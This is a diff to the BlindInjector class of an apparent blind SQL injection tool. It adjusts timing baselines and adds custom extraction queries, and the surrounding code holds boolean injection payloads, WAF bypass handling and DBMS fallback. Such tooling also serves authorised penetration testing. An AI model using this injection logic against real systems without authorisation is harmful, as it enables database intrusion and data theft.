@@ -306,7 +306,11 @@ class BlindInjector:
             except Exception:
                 pass
         if times:
-            return sum(times) / len(times)
+            avg = sum(times) / len(times)
+            # Never return 0: a cached/mocked response can complete below the
+            # clock resolution, and a 0 baseline breaks downstream ratio math
+            # (elapsed / baseline) and timing comparisons.
+            return avg if avg > 0 else 0.001
         return 0.3
 
     def _rate_limit(self):
@@ -477,7 +481,8 @@ class BlindInjector:
 
     def _try_dbms_queries(self, url: str, param: str, dbms: str,
                            result: Dict,
-                           waf_bypass_variants: List[str] = None) -> bool:
+                           waf_bypass_variants: List[str] = None,
+                           custom_queries: Dict[str, str] = None) -> bool:
         self.dbms = dbms
         dbms_query_map = {
             "mysql": MYSQL_QUERIES,
@@ -487,7 +492,9 @@ class BlindInjector:
             "oracle": {"version": "VERSION()", "user": "USER",
                        "database": "ORA_DATABASE_NAME"},
         }
-        queries = dbms_query_map.get(dbms, DEFAULT_QUERIES)
+        queries = dict(dbms_query_map.get(dbms, DEFAULT_QUERIES))
+        if custom_queries:
+            queries.update(custom_queries)
         result["dbms"] = dbms
 
         true_payload = "' AND 1=1-- "
@@ -603,7 +610,8 @@ class BlindInjector:
 
         detected_dbms = forced_dbms or self._auto_detect_dbms(url, param)
         if detected_dbms:
-            if self._try_dbms_queries(url, param, detected_dbms, result, waf_bypass_variants):
+            if self._try_dbms_queries(url, param, detected_dbms, result,
+                                      waf_bypass_variants, custom_queries=queries):
                 self._compute_confidence(result)
                 return result
 
@@ -611,7 +619,8 @@ class BlindInjector:
             if fallback == detected_dbms:
                 continue
             logger.debug("trying fallback DBMS: %s", fallback)
-            if self._try_dbms_queries(url, param, fallback, result, waf_bypass_variants):
+            if self._try_dbms_queries(url, param, fallback, result,
+                                      waf_bypass_variants, custom_queries=queries):
                 self._compute_confidence(result)
                 return result
 
